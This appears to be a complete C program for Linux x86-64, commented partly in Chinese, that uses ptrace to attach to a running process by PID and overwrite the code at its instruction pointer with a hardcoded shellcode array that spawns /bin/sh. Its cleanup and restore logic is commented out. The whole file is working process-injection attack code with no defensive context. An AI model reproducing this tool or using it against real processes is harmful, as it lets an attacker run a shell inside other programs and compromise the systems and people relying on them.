#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>


uint8_t shellcode[] = {0x48, 0x31, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0x89, 0xc6, 0x48, 0x8d, 0x3d, 0x04, 0x00, 0x00, 0x00,
                       0x04, 0x3b, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0xcc, 0x90, 0x90, 0x90};

#define LONGSIZE  sizeof(long)

void getdata(pid_t target_pid, unsigned long addr, uint8_t *dst, unsigned long len) {
    union {
        long val;
        uint8_t bytes[LONGSIZE];
    } data;
    unsigned long i = 0;
    unsigned long j = len / LONGSIZE;
    uint8_t *laddr = dst;
    while (i < j) {
        data.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + (i * LONGSIZE), NULL);
        memcpy(laddr, data.bytes, LONGSIZE);
        ++i;
        laddr += LONGSIZE;
    }

    unsigned long remainder = len % LONGSIZE;
    if (remainder != 0) { // save the remainder, which less than LONGSIZE
        data.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + (i * LONGSIZE), NULL);
        memcpy(laddr, data.bytes, remainder);
    }
}

void putdata(pid_t target_pid, unsigned long addr, uint8_t *src, unsigned long len) {
    union {
        long val;
        uint8_t bytes[LONGSIZE];
    } data;
    unsigned long i = 0;
    unsigned long j = len / LONGSIZE;
    uint8_t *laddr = src;
    while (i < j) {
        memcpy(data.bytes, laddr, LONGSIZE);
        ptrace(PTRACE_POKEDATA, target_pid, addr + (i * LONGSIZE), data.val);
        ++i;
        laddr += LONGSIZE;
    }

    unsigned long remainder = len % LONGSIZE;
    if (remainder != 0) {
        data.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + (i * LONGSIZE), NULL);
        memcpy(data.bytes, laddr, remainder);
        ptrace(PTRACE_POKEDATA, target_pid, addr + (i * LONGSIZE), data.val);
    }
}


//  结束对目标进程的跟踪
void end_tracke_process(pid_t target_pid) {
    if ((ptrace(PTRACE_DETACH, target_pid, NULL, NULL)) < 0) {
        perror("ptrace(DETACH):");
        exit(1);
    }
}

// 让子进程继续运行
void continue_process(pid_t target_pid) {
    if ((ptrace(PTRACE_CONT, target_pid, NULL, NULL)) < 0) {
        perror("ptrace(PTRACE_CONT):");
        exit(1);
    }
}

//  恢复寄存器
void set_registers(pid_t target_pid, struct user_regs_struct *regs) {
    printf("+ Setting instruction pointer to %p\n", (void *) regs->rip);
    if ((ptrace(PTRACE_SETREGS, target_pid, NULL, regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(1);
    }
    printf("+ Run it!\n");
}

// 获取寄存器
int get_registers(pid_t target_pid, struct user_regs_struct *regs) {
    printf("+ Getting Registers\n");
    if ((ptrace(PTRACE_GETREGS, target_pid, NULL, regs)) < 0) {
        perror("ptrace(GETREGS):");
        exit(-1);
    }
//
//    (*regs).rip += 2;
    return 0;
}

//  附加到正在运行的进程
int attach_process(pid_t target_pid) {
    printf("+ Tracing process %d\n", target_pid);
    if ((ptrace(PTRACE_ATTACH, target_pid, NULL, NULL)) < 0) {
        perror("ptrace(ATTACH):");
        exit(-1);
    }
    printf("+ Waiting for process...\n");
    wait(NULL);

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
        exit(1);
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long len = sizeof(shellcode);
    uint8_t backup[len];
    struct user_regs_struct regs;

    attach_process(target_pid);
    get_registers(target_pid, &regs);

    // get context
    getdata(target_pid, regs.rip, backup, len);
    // 对指令指针进行了修改，而这正是必须要在交出控制权之前在目标进程上设置寄存器的原因。实质上，指令指针会变为PTRACE_DEATCH减去2个字节的值。
    //regs.rip += 2;
    putdata(target_pid, regs.rip, shellcode, len);

    continue_process(target_pid);
    int status;
    wait(&status);
//    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
//	    puts("continne the child process. put Enter");
//	    getchar();
//	    putdata(target_pid, regs.rip, backup, len);
//
//	    regs.rip -= 1;
//	    set_registers(target_pid, &regs);
//	    continue_process(target_pid);
//    } else {
//	    puts("child process error");
//    }

    end_tracke_process(target_pid);
    
    return 0;
}

